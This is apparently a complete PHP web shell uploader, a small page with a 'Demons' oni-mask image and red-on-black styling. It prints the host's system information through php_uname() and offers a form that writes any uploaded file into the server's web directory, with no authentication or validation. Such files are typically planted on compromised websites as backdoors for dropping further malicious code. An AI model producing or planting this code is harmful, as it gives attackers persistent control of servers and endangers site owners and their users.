<center><style type="text/css">
@import url(https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two);
html {
	margin: 20px auto;
	background-color:black;
    background-attachment: fixed;
    background-position: center; 
	color: red;
	text-align: center;
}
header {
	color: transparent;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: transparent;
	background: transparent;
	border: 1px dotted red;
	margin-left: 20px;
	text-align: center;
}
</style><img src="https://image.freepik.com/free-vector/demon-oni-mask-with-sakura-vector_43623-586.jpg" alt="Demons" style="width:350px;height:350px;">
<?php
echo "<h1><b><font color='ff00ff'></b></h1>";
echo "<h3><br>".php_uname()."<br></h3>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='nastar'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['nastar']['tmp_name'], $_FILES['nastar']['name'])) {
	echo "Succes";
	} else {
	echo "failed";
	}
}
?>
</center>